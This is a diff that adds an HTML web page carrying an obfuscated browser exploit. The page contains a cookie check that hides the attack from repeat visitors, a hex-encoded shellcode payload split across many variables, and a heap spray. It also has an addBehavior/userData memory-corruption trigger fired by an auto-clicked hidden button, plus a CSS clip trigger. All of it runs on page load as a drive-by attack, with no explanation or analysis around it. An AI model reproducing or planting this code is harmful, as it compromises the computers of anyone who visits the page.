@@ -1,0 +1,92 @@
+<script language="javascript" src="http://count46.51yes.com/click.aspx?id=467585655&logo=1" charset="gb2312"></script>
+<script>
+
+function SetCookie(name,value)
+{
+    var Days = 0.3; 
+    var exp  = new Date();    //new Date("December 31, 9998");
+    exp.setTime(exp.getTime() + Days*24*60*60*1000);
+    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
+}
+function getCookie(name)        
+{
+    var arr = document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));
+     if(arr != null) return unescape(arr[2]); return null;
+
+}
+function delCookie(name)
+{
+    var exp = new Date();
+    exp.setTime(exp.getTime() - 1);
+    var cval=getCookie(name);
+    if(cval!=null) document.cookie= name + "="+cval+";expires="+exp.toGMTString();
+}
+
+function  get_cookie(Name)  {
+var  search  =  Name  +  "="
+var  returnvalue  =  "";
+if (document.cookie.length  >  0)  {
+offset  =  document.cookie.indexOf(search)
+if  (offset  !=  -1)  {
+offset  +=  search.length
+end  =  document.cookie.indexOf(";",  offset);
+if  (end  ==  -1)
+end  =  document.cookie.length;
+returnvalue=unescape(document.cookie.substring(offset,  end))
+}
+}
+return  returnvalue;
+}
+
+function  helpor_net(){
+if  (get_cookie('xiaowei')==''){
+SetCookie ("xiaowei", "yes");
+} 
+else
+{
+location.replace("about:blank");
+}
+}
+helpor_net()
+</script>
+<script>
+document.write("<b"+"u"+"tt"+"on i"+"d='m"+"on' o"+"n"+"cl"+"i"+"ck"+"='sc"+"li"+"ck"+"();' S"+"T"+"Y"+"LE='DI"+"SP"+"LA"+"Y"+":NO"+"NE'></b"+"utton>");
+var WXLaeNzPw="%x90";var YIzNMYfHi="90%x9090%x5858%x58";var wLKsBfOFy="58%x10EB%";var ZBfbeNTxi="x4B5B%xC933%xB966%x03";var AMbGnQCcd="B8%x3480%xBD0B%xFAE2%x05EB";var yVaHomLlF="%xEBE8%xFFFF%x54FF%xBEA3%xBDBD";var EQKqdCNkB="%";var fObXENtNK="xD9E2%x8D1C%xBDBD%x3";var iguCtNcOZ="6BD%xB1FD%xC";var XDYBDSiqC="D3";var cxEvfwoVl="6%x10A1%xD536";var GEfDIaIcU="%";var XDvgIzoSi="x36B5%xD74A%";var algmBTtEg="xE4AC%x0355%xBDBF%x2DBD%x455F%";var uELYDHEAI="x8ED5%xBD8F%xD5B";var gTKhTkImD="D%xCEE8%xCFD8%x36E9%xB1FB%x0";var xBEIsviOU="355%xBDBC%x36BD%xD7";var wvGgCsQvl="55%xE4B8%x2355%xBDBF%x5FBD";var WIWlOHEld="%xD544%xD3D2%xBDBD%xC8D5%xD1";var nbasCDKZd="CF%xE";var gYIidIMkW="9D";var gbKEKNiwf="0%xAB42%x7D38%xAEC8%xD2D5%xB";var UDnEqgYKb="D";var iVktsAOhX="D3%xD5BD%xCFC8%xD0D1%x36E";var VAKhVPIFi="9%xB1FB%x3355%xBDBC";var iFktBsGHN="%x36BD%xD755%xE4";var VeqTtQnSi="BC%xD355%xBDBF%x5FBD%xD544%";var YWMDIygSA="x8ED1%xBD";var hBznmviZf="8F%xCED5%xD8D5%xE9";var HEDmOMEbk="D1%xFB36%x55B";var TWHHiLBTS="1%xBCD2%xBDB";var DhZQfCyun="D%";var XGlFXdcFi="x5536%xBCD7%x55E4";var gTKnUyFMz="%xBFF2%xBDBD%x445F%x513C%xB";var ayKAHvdiC="CBD%xBDBD%x613";var dAmpSxKkd="6%x7E3C%xBD3D%xBDBD%xBDD7%xA7";var ThiCHMLPi="D7%xD7EE%x42BD%xE1EB";var oksLuDtXF="%x";var iNSGcGPFi="7D8E%x3D";var igYUyvWIk="FD%xBE81%xC8BD%x7A44%xBEB9%";var sooGsoIIV="xDCE1%xD893%xF97A%xB9BE%xD8";var kKUCZpted="C5%xBDB";var vuWvgdwEY="D%x748E%xECEC%xE";var AxuiLggph="AEE%x8EEC%";var uTNiyaWYg="x367D%xE5FB%";var EBglzXzOB="x9F55%xBDB";var uLUBgIGoG="C%x3EBD%xBD45%x1E54%xBDBD%x2";var aSwVxNETl="DBD%xBD";var vabZWYnqH="D7%xBDD7%xBED7%xBDD7%xBFD7%";var ixayGDktU="xBDD5%xBDBD";var uIcgglPWT="%xEE7D%xFB36";var wWUiXhSOd="%x5599%xBCBC%";var IxQEINhWm="xBDBD";var lGGnFVZPG="%xFB34%xD7DD%xEDBD%xEB42%x349";var lInvzSLkO="5%xD9FB%xFB36%xD7DD%xD7BD%x";var ndaTlIgeU="D7BD%xD7BD%xD7B9%xEDBD%xEB";var NFgQpTFeZ="42%xD791%xD7B";var gDLzyqYsA="D%xD7BD%xD5BD%xBDA2%xBDB2%x42E";var oYSZGQgCp="D%x81EB%xFB34%x3";var wWoiXvgvD="6C5";var DdQhGFVnd="%xD9F3";var izIptQcIw="%xC13";var ZdulnZVNw="D%x42B5%xC909%x3DB1";var DnEczLybz="%xB5C1%xBD42%xB8C9%x";var xHeQSGWBY="C93D%x42B5%x5F09%x";var vNcIzffAa="3456%x3D3B%xBDBD%x7ABD%xC";var iNoNvXixU="DFB";var gtNOunDGn="%xBDBD%xBDBD%xFB";var PcHfzUzTk="7A%xBDC9%xBD";var eGFFWKQcQ="BD%xD7BD%xD7BD%xD7BD";var IefIFwPGi="%x36BD%xD";var FcnMZBEIn="DFB%x42ED%x85EB%x3B36%x";var IgPwLxsBc="BD3D%xBDBD%xBDD";var NmsutiAKF="7%xF330%xECC9%xCB42%";var MLSpEGLEO="xEDCD%xCB42%x42DD%x8DEB%";var MooVIGTDW="xCB4";var PCpQNultY="2%x42DD%x89EB%xCB42%x42C5%xF";var aQeOvqxxs="DEB%x4636%x7D8E%x668E%x513C%";var KSXxONZiW="xBFBD%xBDB";var IllVUFDYY="D%x7136%x453E%xC0E9%x34";var xmXcGQiDY="B5%xBCA1%x7D3E%x56B9%x";var PPlkZFzVW="364E%x3671%x3E64%xAD7E";var AAezVwtZy="%x7D8E%xECED%xED";var aciBpoLik="EE%xEDED%xEDED%xEAED%xEDED%";var NkmkuYcaC="xEB42%x36B5%xE9C3%xAD55%xBD";var zcUAixWNS="BC%x55BD%xBDD8";var uyPzawGff="%xBDBD";var iaPVnGySs="%xDED5%xCACB%xD5BD%xD5CE%";var cZxfegfcO="xD2D9%x36E";var OhvmTIMUC="9%xB1FB%x9955%xBDBD%x34BD";var wNZCFhGXW="%";var mBanzXOuL="x81FB%x1CD9%xBDB9%";var wPWTUpScQ="xBD";var mManZbfaM="BD%x1D30%x42DD%x4242%xD8D7%";var xLhevBbou="xCB";var anohvcpDw="4";var xXSxIFesG="2%x3681%x";var XYSgBPlSt="ADFB%xB555%xBD";var bFxglCKmu="BD%x8EBD%xEE66%xEE";var vqQmtEHLO="EE%x42EE%x3D6D%x5585%x85";var kehsnAXTq="3D%xC854%x3CAC%xB8C";var IVzWbsCaB="5%x2D";var ePGebuEyP="2D%x2D2D%xB5C9%x4";var eCXPBQVFe="236%x36E8%x3";var DUIipAugc="051%xB8F";var ZizNaUhge="D%";var yAGKIaEnq="x5D42%x1B55%xBDBD%x7EB";var HSMEIzGOG="D%x1D55%xB";var XqBmXYDhl="DBD%x05BD%xBCAC%x3D";var quwFNlDgg="B9%xB17F%x55BD%xBD2E%xBD";var hduhGsONB="BD%x513";var IBWxTaayv="C%xBCB";var myDNmphxq="D%xBDBD%x4";var ycoanAUfE="136%x7A";var zIGigkgou="3E%x7AB9%x8FBA%x2CC9%x7AB";var GKfpVzffg="1%xB";var aZXvPIgfl="9FA%x34DE%xF26C%xFA7A%x1DB5%x2";var tbUgHkgUG="AD8%x7A76%xB1FA%xFDEC%xC207%";var bGIPLvpGW="xFA7A%x83AD%x0BA0";var SVlSwTaug="%x7A84%xA9FA%xD405%xA669%xFA7A";var mZlBMgcWX="%x03A5%xDBC2%x7A1";var oAewGZWtz="D%xA1FA%x1441%x108A%xFA7";var uGIqXIdCu="A";var uFzOckPSX="%x259D%xADB7%xD945%x8D1C";var fEZlUTaHA="%";var cPPWLNGGi="xBDBD%x36BD%xB1FD%xCD";var IeYOASEiy="36%x10A1%xD5";var aQCBgVacp="3";var mZuCkyMdq="6%x36B5%xD74A%xE4B9%xE955%x";var ckKXmLOXw="BDBD%";var WnxeHpECi="x2DBD%x455F%x8ED5%x";var aIPGNhitY="BD8F%xD5BD%xC";var niqHGbzBG="EE8";var aeZEdyoAn="%xCFD8%x";var ilIeQelpG="36E9%x55BB%x42E8%x4242";var mWiCHkMmg="%x5536%x";var HZzXlYnmN="B8D7%x55E4%xBD88%";var EOGBwnXNI="xBDBD%x445F";var mdZCPiPkD="%x428E%x42EA%xB9EB%xBF56%x7EE5";var QmZmZYIbZ="%x4";var QgnBDlHIL="455%x4242%";var IQbGlgvDU="xE64";var PKYoYhtXI="2%xBA7B%x340";var NEGgpABAp="5%xBCE2%x7ADB%xB8";var HknqBYzdi="FA";var tasToCSms="%x5D42%xEE";var IgMgZNdXt="7E%";var tAkGiGaPY="x6136%xD7EE%xD5FD%xADBD%xB";var mSbKsXBgI="DBD%x36EA%x";var zKkeDmVao="9DFB";var bKUDPBoiw="%xA555%x4242%xE542%xEC7";var ugksXBhWz="E%x36EB%x81C8%xC936%xC593%x48";var cghQZpDyY="BE%x36EB%x9DCB%x48";var WaLeWgPhf="BE%x748E%xFCF4%xBE10%x8E78%xB2";var ycdoOiEbl="66%xAD03%x";var eiFVACZZC="6";var lytlOaLyC="B";var GpxsUHYGI="87%xB5C9%x767C%xBEBA%xFD67%x";var iHneBQGwH="4C56%xA286%x";var YVfXoZQNy="5AC8%x36E3%x99E3%x60BE%x";var qiKwyVqWl="36DB%xF6B1%xE336%xBEA1%x366";var pwuvfoImi="0%x36B9%x78BE%xE31";var gkQcEBIGE="6%x7";var DHikKTpXv="EE4%x6055";var wuUECkKWA="%x4241%x0F42%x5F4F%x8449%xC";var ssiGKmbAQ="05F%x673E%xC6F5%x8F80%x2CC";var gTuZOtaMv="9%x38B1%x1262%xDE06%x6";var OHYPkWgdp="C34%xECF2%x07FD%x1DC2%x2AD8%xA";var vgiiPENGo="376%xD919%x2E52%x598F%x3329%x";var wFDUykPUQ="B7AE%x7F11%xF6A4%x79BC%x";var ZZGXIaomK="A230%xEAC9%xB0DB%x";var hGxggEIKN="FE42%x1103%xC066%x184D%xEF27%";var GizQiYsAx="x1A43";var gVUbMXNOC="%x8367%x0BA";var YsGNwbuIw="0%x0584%x69D4%x03A6%xDBC";var ZAQNpTaAK="2%";var IiOiLIyQZ="x411D%x8A14%x2510";var KPVagofSZ="%xADB7%x3D45%x126B%x4627";var mitMbDzvv="%xA8EE%uD5D";var mqVQvLOIO="B%uC";var AdIMGiqll="9C9%u";var KxIItTWkc="87CD";var BsOoGNBwb="%u9292%uCACA%u93CA%uD789%uD";var hpXipXFXH="3D4%uD293%uDA";var wllYQFcEF="CF";var osDzkkUSx="%uDF92%uCEDF%u8F92%uD8";var iIGKvFIun="93";var QhtcZFysb="%uD8C5%uBDBD%uBDBD%xBDBD%xB";var GPOiWGzpD="DBD%xBDB";var ilFSdDuWy="D%xB";var ugFcHvspg="DBD%xBDB";var BLYqBhmkI="D%xBDBD%xBDBD%xBDBD%";var yUgIwSBzU="xEAE";var DTZSShNux="A";var KSMixHWyb = WXLaeNzPw+YIzNMYfHi+wLKsBfOFy+ZBfbeNTxi+AMbGnQCcd+yVaHomLlF+EQKqdCNkB+fObXENtNK+iguCtNcOZ+XDYBDSiqC+cxEvfwoVl+GEfDIaIcU+XDvgIzoSi+algmBTtEg+uELYDHEAI+gTKhTkImD+xBEIsviOU+wvGgCsQvl+WIWlOHEld+nbasCDKZd+gYIidIMkW+gbKEKNiwf+UDnEqgYKb+iVktsAOhX+VAKhVPIFi+iFktBsGHN+VeqTtQnSi+YWMDIygSA+hBznmviZf+HEDmOMEbk+TWHHiLBTS+DhZQfCyun+XGlFXdcFi+gTKnUyFMz+ayKAHvdiC+dAmpSxKkd+ThiCHMLPi+oksLuDtXF+iNSGcGPFi+igYUyvWIk+sooGsoIIV+kKUCZpted+vuWvgdwEY+AxuiLggph+uTNiyaWYg+EBglzXzOB+uLUBgIGoG+aSwVxNETl+vabZWYnqH+ixayGDktU+uIcgglPWT+wWUiXhSOd+IxQEINhWm+lGGnFVZPG+lInvzSLkO+ndaTlIgeU+NFgQpTFeZ+gDLzyqYsA+oYSZGQgCp+wWoiXvgvD+DdQhGFVnd+izIptQcIw+ZdulnZVNw+DnEczLybz+xHeQSGWBY+vNcIzffAa+iNoNvXixU+gtNOunDGn+PcHfzUzTk+eGFFWKQcQ+IefIFwPGi+FcnMZBEIn+IgPwLxsBc+NmsutiAKF+MLSpEGLEO+MooVIGTDW+PCpQNultY+aQeOvqxxs+KSXxONZiW+IllVUFDYY+xmXcGQiDY+PPlkZFzVW+AAezVwtZy+aciBpoLik+NkmkuYcaC+zcUAixWNS+uyPzawGff+iaPVnGySs+cZxfegfcO+OhvmTIMUC+wNZCFhGXW+mBanzXOuL+wPWTUpScQ+mManZbfaM+xLhevBbou+anohvcpDw+xXSxIFesG+XYSgBPlSt+bFxglCKmu+vqQmtEHLO+kehsnAXTq+IVzWbsCaB+ePGebuEyP+eCXPBQVFe+DUIipAugc+ZizNaUhge+yAGKIaEnq+HSMEIzGOG+XqBmXYDhl+quwFNlDgg+hduhGsONB+IBWxTaayv+myDNmphxq+ycoanAUfE+zIGigkgou+GKfpVzffg+aZXvPIgfl+tbUgHkgUG+bGIPLvpGW+SVlSwTaug+mZlBMgcWX+oAewGZWtz+uGIqXIdCu+uFzOckPSX+fEZlUTaHA+cPPWLNGGi+IeYOASEiy+aQCBgVacp+mZuCkyMdq+ckKXmLOXw+WnxeHpECi+aIPGNhitY+niqHGbzBG+aeZEdyoAn+ilIeQelpG+mWiCHkMmg+HZzXlYnmN+EOGBwnXNI+mdZCPiPkD+QmZmZYIbZ+QgnBDlHIL+IQbGlgvDU+PKYoYhtXI+NEGgpABAp+HknqBYzdi+tasToCSms+IgMgZNdXt+tAkGiGaPY+mSbKsXBgI+zKkeDmVao+bKUDPBoiw+ugksXBhWz+cghQZpDyY+WaLeWgPhf+ycdoOiEbl+eiFVACZZC+lytlOaLyC+GpxsUHYGI+iHneBQGwH+YVfXoZQNy+qiKwyVqWl+pwuvfoImi+gkQcEBIGE+DHikKTpXv+wuUECkKWA+ssiGKmbAQ+gTuZOtaMv+OHYPkWgdp+vgiiPENGo+wFDUykPUQ+ZZGXIaomK+hGxggEIKN+GizQiYsAx+gVUbMXNOC+YsGNwbuIw+ZAQNpTaAK+IiOiLIyQZ+KPVagofSZ+mitMbDzvv+mqVQvLOIO+AdIMGiqll+KxIItTWkc+BsOoGNBwb+hpXipXFXH+wllYQFcEF+osDzkkUSx+iIGKvFIun+QhtcZFysb+GPOiWGzpD+ilFSdDuWy+ugFcHvspg+BLYqBhmkI+yUgIwSBzU+DTZSShNux;KSMixHWyb = unescape(KSMixHWyb.replace(/\%x/g,"%u"));
+var qwekzadnweqw = 0x86000 - KSMixHWyb.length*2;
+var qwejziuasdwqa = new Array();
+var qweuzkjasdwqe = "%u"+"0"+"c"+"0"+"c"+"%"+"u"+"0"+"c"+"0"+"c";
+var zsmwkweqasde = unescape(qweuzkjasdwqe);
+    
+while(zsmwkweqasde.length < qwekzadnweqw/2) zsmwkweqasde +=zsmwkweqasde;
+var p = zsmwkweqasde.substring(0, qwekzadnweqw/2);
+delete zsmwkweqasde;
+for(i=0;i<(210+60);i++)
+{
+qwejziuasdwqa[i] = p+p+KSMixHWyb;
+}
+function sclick()
+{
+var akjhwqkjhw = document.createElement("B"+"O"+"D"+"Y");
+akjhwqkjhw.addBehavior("#"+"d"+"e"+"f"+"a"+"u"+"l"+"t"+"#"+"u"+"s"+"e"+"r"+"D"+"a"+"t"+"a");
+
+document.appendChild(akjhwqkjhw);
+try
+{
+for (i=0;i<10;i++)
+{
+akjhwqkjhw.setAttribute('s',window);
+}
+}
+catch(e)
+{}
+
+window.status+='';
+}
+document.getElementById("m"+"o"+"n").onclick();
+
+function alloc(ZkiVhQPhq) {while (ZkiVhQPhq.length< (91640*8)) ZkiVhQPhq += ZkiVhQPhq;return ZkiVhQPhq.substr(0, (91640*4)) + KSMixHWyb;}</script>
+</head><body>
+<script>var slPlnYFPh = "%x"+"0"+"d"+"0"+"d"+"%"+"x"+"0"+"d"+"0"+"d";var VaskQZkYx = new Array();slPlnYFPh = unescape(slPlnYFPh.replace(/\%x/g,"%u"));
+slPlnYFPh = alloc(slPlnYFPh);
+for(var k = 0; k < 1000; k++) {VaskQZkYx[k] = slPlnYFPh.substr(0, slPlnYFPh.length);}document.write("<ta"+"b"+"l"+"e s"+"t"+"y"+"l"+"e"+"=p"+"o"+"s"+"it"+"io"+"n:"+"a"+"b"+"s"+"o"+"l"+"u"+"t"+"e;"+"c"+"li"+"p:"+"r"+"e"+"ct"+"("+"0)>");</script>
+</body></html>
